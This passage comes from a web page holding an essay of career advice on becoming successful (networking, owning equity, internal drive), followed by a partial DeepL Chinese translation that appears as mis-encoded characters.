potential.</p><p>Ask for what you want. You usually wonâ€™t get it, and often the rejection will be painful. But when this works, it works surprisingly well.</p><p>Almost always, the people who say â€œI am going to keep going until this works, and no matter what the challenges are Iâ€™m going to figure them outâ€, and mean it, go on to succeed. They are persistent long enough to give themselves a chance for luck to go their way.</p><p>Airbnb is my benchmark for this. There are so many stories they tell that I wouldnâ€™t recommend trying to reproduce (keeping maxed-out credit cards in those nine-slot three-ring binder pages kids use for baseball cards, eating dollar store cereal for every meal, battle after battle with powerful entrenched interest, and on and on) but they managed to survive long enough for luck to go their way.</p><p>To be willful, you have to be optimisticâ€”hopefully this is a personality trait that can be improved with practice. I have never met a very successful pessimistic person.</p><h2 id="10-Be-hard-to-compete-with"><a href="#10-Be-hard-to-compete-with" class="headerlink" title="10. Be hard to compete with"></a>10. Be hard to compete with</h2><p>Most people understand that companies are more valuable if they are difficult to compete with. This is important, and obviously true.</p><p>But this holds true for you as an individual as well. If what you do can be done by someone else, it eventually will be, and for less money.</p><p>The best way to become difficult to compete with is to build up leverage. For example, you can do it with personal relationships, by building a strong personal brand, or by getting good at the intersection of multiple different fields. There are many other strategies, but you have to figure out some way to do it.</p><p>Most people do whatever most people they hang out with do. This mimetic behavior is usually a mistakeâ€”if youâ€™re doing the same thing everyone else is doing, you will not be hard to compete with.</p><h2 id="11-Build-a-network"><a href="#11-Build-a-network" class="headerlink" title="11. Build a network"></a>11. Build a network</h2><p>Great work requires teams. Developing a network of talented people to work withâ€”sometimes closely, sometimes looselyâ€”is an essential part of a great career. The size of the network of really talented people you know often becomes the limiter for what you can accomplish.</p><p>An effective way to build a network is to help people as much as you can. Doing this, over a long period of time, is what lead to most of my best career opportunities and three of my four best investments. Iâ€™m continually surprised how often something good happens to me because of something I did to help a founder ten years ago.</p><p>One of the best ways to build a network is to develop a reputation for really taking care of the people who work with you. Be overly generous with sharing the upside; it will come back to you 10x. Also, learn how to evaluate what people are great at, and put them in those roles. (This is the most important thing I have learned about management, and I havenâ€™t read much about it.) You want to have a reputation for pushing people hard enough that they accomplish more than they thought they could, but not so hard they burn out.</p><p>Everyone is better at some things than others. Define yourself by your strengths, not your weaknesses. Acknowledge your weaknesses and figure out how to work around them, but donâ€™t let them stop you from doing what you want to do. â€œI canâ€™t do X because Iâ€™m not good at Yâ€ is something I hear from entrepreneurs surprisingly often, and almost always reflects a lack of creativity. The best way to make up for your weaknesses is to hire complementary team members instead of just hiring people who are good at the same things you are.</p><p>A particularly valuable part of building a network is to get good at discovering undiscovered talent. Quickly spotting intelligence, drive, and creativity gets much easier with practice. The easiest way to learn is just to meet a lot of people, and keep track of who goes on to impress you and who doesnâ€™t. Remember that you are mostly looking for rate of improvement, and donâ€™t overvalue experience or current accomplishment.</p><p>I try to always ask myself when I meet someone new â€œis this person a force of nature?â€ Itâ€™s a pretty good heuristic for finding people who are likely to accomplish great things.</p><p>A special case of developing a network is finding someone eminent to take a bet on you, ideally early in your career. The best way to do this, no surprise, is to go out of your way to be helpful. (And remember that you have to pay this forward at some point later!)</p><p>Finally, remember to spend your time with positive people who support your ambitions.</p><h2 id="12-You-get-rich-by-owning-things"><a href="#12-You-get-rich-by-owning-things" class="headerlink" title="12. You get rich by owning things"></a>12. You get rich by owning things</h2><p>The biggest economic misunderstanding of my childhood was that people got rich from high salaries. Though there are some exceptionsâ€”entertainers for example â€”almost no one in the history of the Forbes list has gotten there with a salary.</p><p>You get truly rich by owning things that increase rapidly in value.</p><p>This can be a piece of a business, real estate, natural resource, intellectual property, or other similar things. But somehow or other, you need to own equity in something, instead of just selling your time. Time only scales linearly.</p><p>The best way to make things that increase rapidly in value is by making things people want at scale.</p><h2 id="13-Be-internally-driven"><a href="#13-Be-internally-driven" class="headerlink" title="13. Be internally driven"></a>13. Be internally driven</h2><p>Most people are primarily externally driven; they do what they do because they want to impress other people. This is bad for many reasons, but here are two important ones.</p><p>First, you will work on consensus ideas and on consensus career tracks.  You will care a lotâ€”much more than you realizeâ€”if other people think youâ€™re doing the right thing. This will probably prevent you from doing truly interesting work, and even if you do, someone else would have done it anyway.</p><p>Second, you will usually get risk calculations wrong. Youâ€™ll be very focused on keeping up with other people and not falling behind in competitive games, even in the short term.</p><p>Smart people seem to be especially at risk of such externally-driven behavior. Being aware of it helps, but only a littleâ€”you will likely have to work super-hard to not fall in the mimetic trap.</p><p>The most successful people I know are primarily internally driven; they do what they do to impress themselves and because they feel compelled to make something happen in the world. After youâ€™ve made enough money to buy whatever you want and gotten enough social status that it stops being fun to get more, this is the only force I know of that will continue to drive you to higher levels of performance.</p><p>This is why the question of a personâ€™s motivation is so important. Itâ€™s the first thing I try to understand about someone. The right motivations are hard to define a set of rules for, but you know it when you see it.</p><p>Jessica Livingston and Paul Graham are my benchmarks for this. YC was widely mocked for the first few years, and almost no one thought it would be a big success when they first started. But they thought it would be great for the world if it worked, and they love helping people, and they were convinced their new model was better than the existing model.</p><p>Eventually, you will define your success by performing excellent work in areas that are important to you. The sooner you can start off in that direction, the further you will be able to go. It is hard to be wildly successful at anything you arenâ€™t obsessed with.</p><h2 id="1-A-comment-response-I-wrote-on-HN"><a href="#1-A-comment-response-I-wrote-on-HN" class="headerlink" title="[1] A comment response I wrote on HN:"></a>[1] A comment response I wrote on HN:</h2><p>One of the biggest reasons Iâ€™m excited about basic income is the amount of human potential it will unleash by freeing more people to take risks.<br>Until then, if you arenâ€™t born lucky, you have to claw your way up for awhile before you can take big swings. If you are born in extreme poverty, then this is super difficult :(</p><p>It is obviously an incredible shame and waste that opportunity is so unevenly distributed. But Iâ€™ve witnessed enough people be born with the deck stacked badly against them and go on to incredible success to know itâ€™s possible.</p><p>I am deeply aware of the fact that I personally would not be where I am if I werenâ€™t born incredibly lucky.</p><p>Thanks to Brian Armstrong, Greg Brockman, Dalton Caldwell, Diane von Furstenberg, Maddie Hall, Drew Houston, Vinod Khosla, Jessica Livingston, Jon Levy, Luke Miles (6 drafts!), Michael Moritz, Ali Rowghani, Michael Seibel, Peter Thiel, Tracy Young and Shivon Zilis for reviewing drafts of this, and thanks especially to Lachy Groom for help writing it.</p><h2 id="ä»¥ä¸‹æ˜¯-DeepL-çš„ç¿»è¯‘"><a href="#ä»¥ä¸‹æ˜¯-DeepL-çš„ç¿»è¯‘" class="headerlink" title="ä»¥ä¸‹æ˜¯ DeepL çš„ç¿»è¯‘"></a>ä»¥ä¸‹æ˜¯ DeepL çš„ç¿»è¯‘</h2><p>æ ‡é¢˜ï¼š å¦‚ä½•è·å¾—æˆåŠŸ</p><p>æˆ‘è§‚å¯Ÿäº†æ•°ä»¥åƒè®¡çš„åˆ›å§‹äººï¼Œå¹¶æ€è€ƒäº†å¾ˆå¤šå…³äºèµšå–å·¨é¢é‡‘é’±æˆ–åˆ›é€ é‡è¦äº‹ç‰©æ‰€éœ€çš„ä¸œè¥¿ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œäººä»¬ä¸€å¼€å§‹å¸Œæœ›å¾—åˆ°å‰è€…ï¼Œæœ€åå´å¸Œæœ›å¾—åˆ°åè€…ã€‚</p><p>è¿™é‡Œæœ‰13ä¸ªå…³äºå¦‚ä½•å®ç°è¿™ç§è¶…å¸¸æˆåŠŸçš„æƒ³æ³•ã€‚ä¸€æ—¦ä½ å·²ç»è¾¾åˆ°äº†æˆåŠŸçš„åŸºæœ¬ç¨‹åº¦ï¼ˆé€šè¿‡ç‰¹æƒæˆ–åŠªåŠ›ï¼‰ï¼Œå¹¶æƒ³æŠ•å…¥å·¥ä½œå°†å…¶è½¬åŒ–ä¸ºç¦»ç¾¤çš„æˆåŠŸï¼Œè¿™é‡Œçš„ä¸€åˆ‡å°±æ›´å®¹æ˜“åšåˆ°ã€‚[1] ä½†å…¶ä¸­å¤§éƒ¨åˆ†å†…å®¹é€‚ç”¨äºä»»ä½•äººã€‚</p><h2 id="1-å¤åˆ©è‡ªå·±"><a href="#1-å¤åˆ©è‡ªå·±" class="headerlink" title="1. å¤åˆ©è‡ªå·±"></a>1. å¤åˆ©è‡ªå·±</h2><p>å¤åˆ©æ˜¯ä¸€ç§é­”æ³•ã€‚åˆ°å¤„å¯»æ‰¾å®ƒã€‚æŒ‡æ•°æ›²çº¿æ˜¯åˆ›é€ è´¢å¯Œçš„å…³é”®ã€‚</p><p>ä¸€ä¸ªä¸­ç­‰è§„æ¨¡çš„ä¼ä¸šï¼Œå¦‚æœæ¯å¹´çš„ä»·å€¼å¢é•¿50%ï¼Œå°±ä¼šåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…å˜å¾—å·¨å¤§ã€‚ä¸–ç•Œä¸Šå¾ˆå°‘æœ‰ä¼ä¸šæ‹¥æœ‰çœŸæ­£çš„ç½‘ç»œæ•ˆåº”å’Œæç«¯çš„å¯æ‰©å±•æ€§ã€‚ä½†éšç€æŠ€æœ¯çš„å‘å±•ï¼Œä¼šæœ‰è¶Šæ¥è¶Šå¤šçš„ä¼ä¸šã€‚ å€¼å¾—èŠ±å¤§åŠ›æ°”å»å¯»æ‰¾å®ƒä»¬ï¼Œåˆ›é€ å®ƒä»¬ã€‚</p><p>ä½ ä¹Ÿæƒ³è®©è‡ªå·±æˆä¸ºä¸€æ¡æŒ‡æ•°æ›²çº¿â€“ä½ çš„ç›®æ ‡åº”è¯¥æ˜¯è®©ä½ çš„ç”Ÿæ´»éµå¾ªä¸€æ¡ä¸æ–­å¢åŠ çš„å‘ä¸Šå’Œå‘å³çš„è½¨è¿¹ã€‚é‡è¦çš„æ˜¯ï¼Œè¦æœç€å…·æœ‰å¤åˆæ•ˆåº”çš„èŒä¸šå‘å±•â€“å¤§å¤šæ•°èŒä¸šçš„å‘å±•æ˜¯ç›¸å½“çº¿æ€§çš„ã€‚</p><p>ä½ ä¸å¸Œæœ›åœ¨ä¸€ä¸ªèŒä¸šä¸­ï¼Œåšäº†ä¸¤å¹´çš„äººå¯ä»¥å’Œåšäº†äºŒåå¹´çš„äººä¸€æ ·æœ‰æ•ˆâ€“ä½ çš„å­¦ä¹ ç‡åº”è¯¥ä¸€ç›´å¾ˆé«˜ã€‚éšç€ä½ äº‹ä¸šçš„å‘å±•ï¼Œä½ æ‰€åšçš„æ¯ä¸€ä¸ªå•ä½çš„å·¥ä½œåº”è¯¥äº§ç”Ÿè¶Šæ¥è¶Šå¤šçš„ç»“æœã€‚æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥è·å¾—è¿™ç§æ æ†ä½œç”¨ï¼Œå¦‚èµ„æœ¬ã€æŠ€æœ¯ã€å“ç‰Œã€ç½‘ç»œæ•ˆåº”å’Œç®¡ç†äººã€‚</p><p>ä¸ç®¡ä½ æŠŠä»€ä¹ˆå®šä¹‰ä¸ºä½ çš„æˆåŠŸæŒ‡æ ‡â€“é‡‘é’±ã€åœ°ä½ã€å¯¹ä¸–ç•Œçš„å½±å“ï¼Œæˆ–è€…å…¶ä»–ä»€ä¹ˆï¼Œä¸“æ³¨äºå†åŠ ä¸€ä¸ªé›¶æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚æˆ‘æ„¿æ„åœ¨é¡¹ç›®ä¹‹é—´èŠ±å°½å¯èƒ½å¤šçš„æ—¶é—´æ¥å¯»æ‰¾æˆ‘çš„ä¸‹ä¸€ä»¶äº‹ã€‚ä½†æˆ‘æ€»æ˜¯å¸Œæœ›å®ƒæ˜¯ä¸€ä¸ªé¡¹ç›®ï¼Œå¦‚æœæˆåŠŸï¼Œå°†ä½¿æˆ‘èŒä¸šç”Ÿæ¶¯çš„å…¶ä½™éƒ¨åˆ†çœ‹èµ·æ¥åƒä¸€ä¸ªè„šæ³¨ã€‚</p><p>å¤§å¤šæ•°äººåœ¨çº¿æ€§æœºä¼šä¸­é™·å…¥å›°å¢ƒã€‚è¦æ„¿æ„è®©å°çš„æœºä¼šæ¶ˆå¤±ï¼Œä»¥ä¸“æ³¨äºæ½œåœ¨çš„æ­¥éª¤å˜åŒ–ã€‚</p><p>æˆ‘è®¤ä¸ºå•†ä¸šä¸Šæœ€å¤§çš„ç«äº‰ä¼˜åŠ¿â€“æ— è®ºæ˜¯å¯¹å…¬å¸è¿˜æ˜¯å¯¹ä¸ªäººçš„èŒä¸šç”Ÿæ¶¯â€“æ˜¯é•¿æœŸçš„æ€è€ƒï¼Œå¯¹ä¸–ç•Œä¸Šä¸åŒçš„ç³»ç»Ÿå¦‚ä½•ç»“åˆèµ·æ¥æœ‰ä¸€ä¸ªå¹¿æ³›çš„çœ‹æ³•ã€‚å¤åˆå¢é•¿çš„ä¸€ä¸ªæ˜¾è‘—æ–¹é¢æ˜¯ï¼Œæœ€è¿œçš„å¹´ä»½æ˜¯æœ€é‡è¦çš„ã€‚åœ¨è¿™ä¸ªä¸–ç•Œä¸Šï¼Œå‡ ä¹æ²¡æœ‰äººé‡‡å–çœŸæ­£çš„é•¿æœŸè§‚ç‚¹ï¼Œå¸‚åœºå¯¹é‚£äº›è¿™æ ·åšçš„äººç»™äºˆäº†ä¸°åšçš„å›æŠ¥ã€‚</p><p>ç›¸ä¿¡æŒ‡æ•°ï¼Œè¦æœ‰è€å¿ƒï¼Œå¹¶è·å¾—æƒŠå–œã€‚</p><h2 id="2-æ‹¥æœ‰å‡ ä¹å¤ªå¤šçš„è‡ªä¿¡å¿ƒ"><a href="#2-æ‹¥æœ‰å‡ ä¹å¤ªå¤šçš„è‡ªä¿¡å¿ƒ" class="headerlink" title="2. æ‹¥æœ‰å‡ ä¹å¤ªå¤šçš„è‡ªä¿¡å¿ƒ"></a>2. æ‹¥æœ‰å‡ ä¹å¤ªå¤šçš„è‡ªä¿¡å¿ƒ</h2><p>è‡ªä¿¡çš„åŠ›é‡æ˜¯å·¨å¤§çš„ã€‚æˆ‘è®¤è¯†çš„æœ€æˆåŠŸçš„äººå¯¹è‡ªå·±çš„ä¿¡å¿µå‡ ä¹è¾¾åˆ°äº†å¦„æƒ³çš„ç¨‹åº¦ã€‚</p><p>å°½æ—©åŸ¹å…»è¿™ç§ä¿¡å¿µã€‚å½“ä½ å¾—åˆ°æ›´å¤šçš„æ•°æ®ï¼Œè¯æ˜ä½ çš„åˆ¤æ–­åŠ›æ˜¯å¥½çš„ï¼Œè€Œä¸”ä½ èƒ½æŒç»­æä¾›ç»“æœæ—¶ï¼Œå°±æ›´åŠ ç›¸ä¿¡è‡ªå·±ã€‚</p><p>å¦‚æœä½ ä¸ç›¸ä¿¡è‡ªå·±ï¼Œå°±å¾ˆéš¾è®©è‡ªå·±å¯¹æœªæ¥æœ‰é€†å‘çš„æƒ³æ³•ã€‚ä½†è¿™æ˜¯æœ€èƒ½åˆ›é€ ä»·å€¼çš„åœ°æ–¹ã€‚</p><p>æˆ‘è®°å¾—å¾ˆå¤šå¹´å‰ï¼ŒåŸƒéš†-é©¬æ–¯å…‹å¸¦æˆ‘å‚è§‚äº†SpaceXçš„å·¥å‚ã€‚ä»–è¯¦ç»†è°ˆè®ºäº†ç«ç®­çš„æ¯ä¸€ä¸ªéƒ¨åˆ†çš„åˆ¶é€ ï¼Œä½†è®©æˆ‘è®°å¿†çŠ¹æ–°çš„æ˜¯ï¼Œå½“ä»–è°ˆåˆ°å°†å¤§å‹ç«ç®­é€å¾€ç«æ˜Ÿæ—¶ï¼Œä»–è„¸ä¸Šéœ²å‡ºäº†ç»å¯¹è‚¯å®šçš„è¡¨æƒ…ã€‚æˆ‘ç¦»å¼€æ—¶æƒ³ï¼šâ€å•Šï¼ŒåŸæ¥è¿™å°±æ˜¯ä¿¡å¿µçš„åŸºå‡†ã€‚â€</p><p>ç®¡ç†ä½ è‡ªå·±çš„å£«æ°”â€“ä»¥åŠä½ çš„å›¢é˜Ÿçš„å£«æ°”â€“æ˜¯å¤§å¤šæ•°å·¥ä½œçš„æœ€å¤§æŒ‘æˆ˜ä¹‹ä¸€ã€‚å¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„è‡ªä¿¡å¿ƒï¼Œè¿™å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚ä¸å¹¸çš„æ˜¯ï¼Œä½ è¶Šæœ‰é›„å¿ƒå£®å¿—ï¼Œä¸–ç•Œå°±è¶Šæƒ³æŠŠä½ æ‰“å€’ã€‚ </p><p>å¤§å¤šæ•°é«˜åº¦æˆåŠŸçš„äººè‡³å°‘æœ‰ä¸€æ¬¡åœ¨äººä»¬è®¤ä¸ºä»–ä»¬é”™äº†çš„æ—¶å€™ï¼Œå¯¹æœªæ¥çš„çœ‹æ³•æ˜¯çœŸæ­£æ­£ç¡®çš„ã€‚å¦‚æœä¸æ˜¯è¿™æ ·ï¼Œä»–ä»¬ä¼šé¢ä¸´æ›´å¤šçš„ç«äº‰ã€‚</p><p>è‡ªä¿¡å¿…é¡»ä¸è‡ªæˆ‘æ„è¯†ç›¸å¹³è¡¡ã€‚æˆ‘æ›¾ç»è®¨åŒä»»ä½•å½¢å¼çš„æ‰¹è¯„ï¼Œå¹¶ä¸»åŠ¨å›é¿å®ƒã€‚ç°åœ¨ï¼Œæˆ‘è¯•ç€æ€»æ˜¯åœ¨å‡è®¾å®ƒæ˜¯çœŸå®çš„æƒ…å†µä¸‹å¬å–å®ƒï¼Œç„¶åå†³å®šæ˜¯å¦è¦é‡‡å–è¡ŒåŠ¨ã€‚å¯»æ±‚çœŸç†æ˜¯å›°éš¾çš„ï¼Œè€Œä¸”å¸¸å¸¸æ˜¯ç—›è‹¦çš„ï¼Œä½†å®ƒæ˜¯åŒºåˆ†è‡ªä¿¡å¿ƒå’Œè‡ªæ¬ºæ¬ºäººçš„åŸå› ã€‚</p><p>è¿™ç§å¹³è¡¡ä¹Ÿæœ‰åŠ©äºä½ é¿å…è¡¨ç°å‡ºæœ‰æƒå’Œä¸åˆç¾¤çš„æ ·å­ã€‚</p><h2 id="3-å­¦ä¼šç‹¬ç«‹æ€è€ƒ"><a href="#3-å­¦ä¼šç‹¬ç«‹æ€è€ƒ" class="headerlink" title="3. å­¦ä¼šç‹¬ç«‹æ€è€ƒ"></a>3. å­¦ä¼šç‹¬ç«‹æ€è€ƒ</h2><p>åˆ›ä¸šç²¾ç¥æ˜¯å¾ˆéš¾æ•™çš„ï¼Œå› ä¸ºåŸåˆ›æ€§æ€ç»´æ˜¯å¾ˆéš¾æ•™çš„ã€‚å­¦æ ¡çš„è®¾ç½®ä¸æ˜¯ä¸ºäº†æ•™è¿™ä¸ªâ€“äº‹å®ä¸Šï¼Œå®ƒé€šå¸¸å¥–åŠ±ç›¸åçš„ä¸œè¥¿ã€‚æ‰€ä»¥ä½ å¿…é¡»è‡ªå·±åŸ¹å…»å®ƒã€‚</p><p>ä»ç¬¬ä¸€åŸåˆ™å‡ºå‘æ€è€ƒå¹¶è¯•å›¾äº§ç”Ÿæ–°çš„æƒ³æ³•æ˜¯å¾ˆæœ‰è¶£çš„ï¼Œè€Œæ‰¾åˆ°ä¸ä¹‹äº¤æµçš„äººæ˜¯åœ¨è¿™æ–¹é¢åšå¾—æ›´å¥½çš„ä¸€ä¸ªå¥½æ–¹æ³•ã€‚ä¸‹ä¸€æ­¥æ˜¯æ‰¾åˆ°ç®€å•ã€å¿«é€Ÿçš„æ–¹æ³•ï¼Œåœ¨ç°å®ä¸–ç•Œä¸­æµ‹è¯•è¿™äº›æƒ³æ³•ã€‚</p><p>â€œæˆ‘ä¼šå¤±è´¥å¾ˆå¤šæ¬¡ï¼Œè€Œæˆ‘çœŸçš„ä¼šå¯¹ä¸€æ¬¡ â€œæ˜¯ä¼ä¸šå®¶çš„æ–¹å¼ã€‚ä½ å¿…é¡»ç»™è‡ªå·±å¾ˆå¤šæœºä¼šæ¥è·å¾—å¹¸è¿ã€‚</p><p>è¦å­¦ä¹ çš„æœ€æœ‰åŠ›çš„è¯¾ç¨‹ä¹‹ä¸€æ˜¯ï¼Œä½ å¯ä»¥åœ¨ä¼¼ä¹æ²¡æœ‰è§£å†³æ–¹æ¡ˆçš„æƒ…å†µä¸‹æƒ³å‡ºåŠæ³•ã€‚ä½ è¿™æ ·åšçš„æ¬¡æ•°è¶Šå¤šï¼Œä½ å°±ä¼šè¶Šç›¸ä¿¡å®ƒã€‚å‹‡æ°”æ¥è‡ªäºå­¦ä¹ ä½ å¯ä»¥åœ¨è¢«å‡»å€’åé‡æ–°ç«™èµ·æ¥ã€‚</p><h2 id="4-å–„äº-â€œé”€å”®â€"><a href="#4-å–„äº-â€œé”€å”®â€" class="headerlink" title="4. å–„äº â€œé”€å”®â€"></a>4. å–„äº â€œé”€å”®â€</h2><p>å…‰æœ‰è‡ªä¿¡å¿ƒæ˜¯ä¸å¤Ÿçš„ï¼Œä½ è¿˜å¿…é¡»èƒ½å¤Ÿè¯´æœå…¶ä»–äººç›¸ä¿¡ä½ çš„æƒ³æ³•ã€‚</p><p>æ‰€æœ‰ä¼Ÿå¤§çš„äº‹ä¸šï¼Œåœ¨æŸç§ç¨‹åº¦ä¸Šï¼Œéƒ½æˆä¸ºé”€å”®å·¥ä½œã€‚ä½ å¿…é¡»å‘å®¢æˆ·ã€æœªæ¥çš„å‘˜å·¥ã€åª’ä½“ã€æŠ•èµ„è€…ç­‰å®£æ‰¬ä½ çš„è®¡åˆ’ã€‚è¿™éœ€è¦ä¸€ä¸ªé¼“èˆäººå¿ƒçš„æ„¿æ™¯ï¼Œå¼ºå¤§çš„æ²Ÿé€šæŠ€å·§ï¼Œä¸€å®šç¨‹åº¦çš„é­…åŠ›ï¼Œä»¥åŠæ‰§è¡Œèƒ½åŠ›çš„è¯æ˜ã€‚</p><p>å–„äºæ²Ÿé€šï¼Œç‰¹åˆ«æ˜¯ä¹¦é¢æ²Ÿé€šï¼Œæ˜¯ä¸€é¡¹å€¼å¾—æŠ•èµ„çš„å·¥ä½œã€‚æˆ‘å¯¹æ¸…æ™°æ²Ÿé€šçš„æœ€ä½³å»ºè®®æ˜¯ï¼Œé¦–å…ˆç¡®ä¿ä½ çš„æ€è·¯æ¸…æ™°ï¼Œç„¶åä½¿ç”¨å¹³å®ã€ç®€æ˜çš„è¯­è¨€ã€‚</p><p>åšå¥½é”€å”®çš„æœ€å¥½æ–¹æ³•æ˜¯çœŸæ­£ç›¸ä¿¡ä½ æ‰€é”€å”®çš„ä¸œè¥¿ã€‚é”€å”®ä½ çœŸæ­£ç›¸ä¿¡çš„ä¸œè¥¿æ„Ÿè§‰å¾ˆå¥½ï¼Œè€Œè¯•å›¾é”€å”®è›‡æ²¹çš„æ„Ÿè§‰å¾ˆç³Ÿç³•ã€‚</p><p>æ“…é•¿é”€å”®å°±åƒæé«˜å…¶ä»–æŠ€èƒ½ä¸€æ ·ï¼Œä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡åˆ»æ„ç»ƒä¹ è€Œå˜å¾—æ›´å¥½ã€‚ä½†å‡ºäºæŸç§åŸå› ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºå®ƒè®©äººæ„Ÿåˆ°åŒæ¶ï¼Œè®¸å¤šäººæŠŠå®ƒå½“ä½œæ— æ³•å­¦ä¹ çš„ä¸œè¥¿ã€‚</p><p>æˆ‘çš„å¦ä¸€ä¸ªé‡è¦çš„é”€å”®å»ºè®®æ˜¯åœ¨é‡è¦çš„æ—¶å€™äº²è‡ªå‡ºé¢ã€‚å½“æˆ‘åˆšå¼€å§‹å·¥ä½œæ—¶ï¼Œæˆ‘æ€»æ˜¯æ„¿æ„åé£æœºã€‚è¿™ç»å¸¸æ˜¯ä¸å¿…è¦çš„ï¼Œä½†æœ‰ä¸‰æ¬¡å®ƒå¯¼è‡´äº†æˆ‘çš„èŒä¸šç”Ÿæ¶¯çš„è½¬æŠ˜ç‚¹ï¼Œå¦åˆ™å°±ä¼šèµ°åˆ°å¦ä¸€ä¸ªæ–¹å‘ã€‚</p><h2 id="5-è®©äººå®¹æ˜“æ‰¿æ‹…é£é™©"><a href="#5-è®©äººå®¹æ˜“æ‰¿æ‹…é£é™©" class="headerlink" title="5.è®©äººå®¹æ˜“æ‰¿æ‹…é£é™©"></a>5.è®©äººå®¹æ˜“æ‰¿æ‹…é£é™©</h2><p>å¤§å¤šæ•°äººé«˜ä¼°äº†é£é™©ï¼Œä½ä¼°äº†å›æŠ¥ã€‚æ‰¿æ‹…é£é™©æ˜¯å¾ˆé‡è¦çš„ï¼Œå› ä¸ºä½ ä¸å¯èƒ½ä¸€ç›´éƒ½æ˜¯æ­£ç¡®çš„ï¼Œä½ å¿…é¡»å°è¯•å¾ˆå¤šä¸œè¥¿ï¼Œå¹¶åœ¨ä½ å­¦åˆ°æ›´å¤šä¸œè¥¿æ—¶è¿…é€Ÿé€‚åº”ã€‚</p><p>åœ¨ä½ èŒä¸šç”Ÿæ¶¯çš„æ—©æœŸï¼Œå¾€å¾€æ›´å®¹æ˜“æ‰¿æ‹…é£é™©ï¼›ä½ æ²¡æœ‰ä»€ä¹ˆæŸå¤±ï¼Œè€Œä½ æœ‰å¯èƒ½è·å¾—å¾ˆå¤šã€‚ä¸€æ—¦ä½ è®©è‡ªå·±çš„åŸºæœ¬ä¹‰åŠ¡å¾—åˆ°ä¿éšœï¼Œä½ å°±åº”è¯¥è¯•ç€è®©è‡ªå·±å®¹æ˜“æ‰¿æ‹…é£é™©ã€‚å¯»æ‰¾ä½ å¯ä»¥åšçš„å°èµŒæ³¨ï¼Œå¦‚æœä½ é”™äº†ï¼Œä½ ä¼šæŸå¤±1å€ï¼Œä½†å¦‚æœæˆåŠŸäº†ï¼Œä¼šèµš100å€ã€‚ç„¶åæœç€è¿™ä¸ªæ–¹å‘åšä¸€ä¸ªæ›´å¤§çš„èµŒæ³¨ã€‚</p><p>ä¸è¿‡ï¼Œä¸è¦ç§¯æ”’å¤ªä¹…ã€‚åœ¨YCï¼Œæˆ‘ä»¬ç»å¸¸æ³¨æ„åˆ°é‚£äº›åœ¨è°·æ­Œæˆ–Facebookå·¥ä½œäº†å¾ˆé•¿æ—¶é—´çš„åˆ›å§‹äººçš„ä¸€ä¸ªé—®é¢˜ã€‚å½“äººä»¬ä¹ æƒ¯äº†èˆ’é€‚çš„ç”Ÿæ´»ï¼Œå¯é¢„æµ‹çš„å·¥ä½œï¼Œä»¥åŠæ— è®ºåšä»€ä¹ˆéƒ½èƒ½æˆåŠŸçš„å£°èª‰æ—¶ï¼Œå°±å¾ˆéš¾å°†å…¶æŠ›åœ¨è„‘åï¼ˆäººä»¬æœ‰ä¸€ç§éš¾ä»¥ç½®ä¿¡çš„èƒ½åŠ›ï¼Œæ€»æ˜¯å°†è‡ªå·±çš„ç”Ÿæ´»æ–¹å¼ä¸æ˜å¹´çš„å·¥èµ„ç›¸åŒ¹é…ï¼‰ã€‚å³ä½¿ä»–ä»¬çœŸçš„ç¦»å¼€äº†ï¼Œè¿”å›çš„è¯±æƒ‘ä¹Ÿå¾ˆå¤§ã€‚å°†çŸ­æœŸåˆ©ç›Šå’Œä¾¿åˆ©æ€§ç½®äºé•¿æœŸæˆå°±ä¹‹ä¸Šæ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä¹Ÿæ˜¯äººç±»çš„å¤©æ€§ã€‚ </p><p>ä½†æ˜¯ï¼Œå½“ä½ ä¸åœ¨è·‘æ­¥æœºä¸Šæ—¶ï¼Œä½ å¯ä»¥è·Ÿéšä½ çš„ç›´è§‰ï¼ŒæŠŠæ—¶é—´èŠ±åœ¨é‚£äº›å¯èƒ½å˜æˆçœŸæ­£æœ‰è¶£çš„äº‹æƒ…ä¸Šã€‚åœ¨å°½å¯èƒ½é•¿çš„æ—¶é—´å†…ä¿æŒä½ çš„ç”Ÿæ´»å»‰ä»·å’Œçµæ´»æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–¹æ³•ï¼Œä½†æ˜¾ç„¶æ˜¯æœ‰ä»£ä»·çš„ã€‚</p><h2 id="6-ä¸“æ³¨"><a href="#6-ä¸“æ³¨" class="headerlink" title="6. ä¸“æ³¨"></a>6. ä¸“æ³¨</h2><p>ä¸“æ³¨æ˜¯å·¥ä½œä¸­çš„ä¸€ç§åŠ›é‡å€å¢å™¨ã€‚</p><p>æˆ‘è§è¿‡çš„å‡ ä¹æ¯ä¸ªäººéƒ½ä¼šèŠ±æ›´å¤šçš„æ—¶é—´æ¥æ€è€ƒè¯¥ä¸“æ³¨äºä»€ä¹ˆã€‚åœ¨æ­£ç¡®çš„äº‹æƒ…ä¸Šå·¥ä½œæ¯”åœ¨è®¸å¤šæ—¶é—´ä¸Šå·¥ä½œè¦é‡è¦å¾—å¤šã€‚å¤§å¤šæ•°äººæŠŠå¤§éƒ¨åˆ†æ—¶é—´æµªè´¹åœ¨ä¸é‡è¦çš„äº‹æƒ…ä¸Šã€‚</p><p>ä¸€æ—¦ä½ æƒ³æ¸…æ¥šäº†è¦åšä»€ä¹ˆï¼Œå°±è¦åŠ¿ä¸å¯æŒ¡åœ°è¿…é€Ÿå®Œæˆä½ é‚£ä¸€å°æ’®ä¼˜å…ˆäº‹é¡¹ã€‚æˆ‘è¿˜æ²¡æœ‰è§è¿‡ä¸€ä¸ªè¡ŒåŠ¨ç¼“æ…¢çš„äººéå¸¸æˆåŠŸã€‚</p><h2 id="7-åŠªåŠ›å·¥ä½œ"><a href="#7-åŠªåŠ›å·¥ä½œ" class="headerlink" title="7. åŠªåŠ›å·¥ä½œ"></a>7. åŠªåŠ›å·¥ä½œ</h2><p>ä½ å¯ä»¥é€šè¿‡èªæ˜æˆ–åŠªåŠ›å·¥ä½œè¾¾åˆ°ä½ 